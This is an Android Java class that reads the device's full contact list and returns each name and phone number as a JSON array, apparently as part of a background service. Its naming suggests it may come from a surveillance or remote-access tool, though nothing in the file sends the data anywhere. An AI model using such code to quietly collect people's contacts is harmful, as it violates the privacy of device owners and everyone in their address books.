package com.behavioralanalysis.service;

import android.database.Cursor;
import android.provider.ContactsContract;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Contacts {
    public static JSONArray get() {
        JSONArray array = new JSONArray();

        try {
            Cursor cursor = MainService
                    .getContext()
                    .getContentResolver()
                    .query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            while (cursor.moveToNext()) {
                JSONObject object = new JSONObject();
                object.put(
                        "number",
                        cursor.getString(
                                cursor.getColumnIndex(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                        )
                );
                object.put(
                        "name",
                        cursor.getString(
                                cursor.getColumnIndex(
                                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                                )
                        )
                );
                array.put(object);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return array;
    }
}
